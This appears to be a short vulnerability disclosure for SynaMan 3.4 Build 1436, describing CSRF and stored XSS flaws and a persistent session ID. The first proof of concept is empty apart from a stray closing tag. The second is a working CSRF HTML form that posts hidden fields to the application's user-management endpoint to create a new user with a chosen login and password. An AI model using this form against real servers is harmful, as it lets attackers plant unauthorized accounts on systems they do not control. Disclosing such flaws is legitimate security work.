# EXPLOIT DESCRIPTION #
SynaMan 3.4 Build 1436 is vulnerable to CSRF attacks, which can also be combined with stored XSS attacks (authenticated administrators only). The JSESSIONID created when a user logs on to the system is persistent and does not change across requests.


# POC 1 #
The following PoC uses the CSRF vulnerability together with one of the stored XSS vulnerabilities, to create a new shared folder in the application.

</html>


# POC 2 #
The following PoC uses the CSRF vulnerability to create a new user with the details shown.

<html>
<body>
<form name="evilform" method="post" action="http://192.168.1.67:6060/app?operation=mngUsers">
<input type="hidden" name="fullName" value="marlow"/>
<input type="hidden" name="login" value="marlow@marlow.com" />
<input type="hidden" name="password" value="marlow" />
<input type="hidden" name="operation" value="mngUsers" />
<input type="hidden" name="st" value="saveUser" />
<input type="hidden" name="oldLogin" value="" />
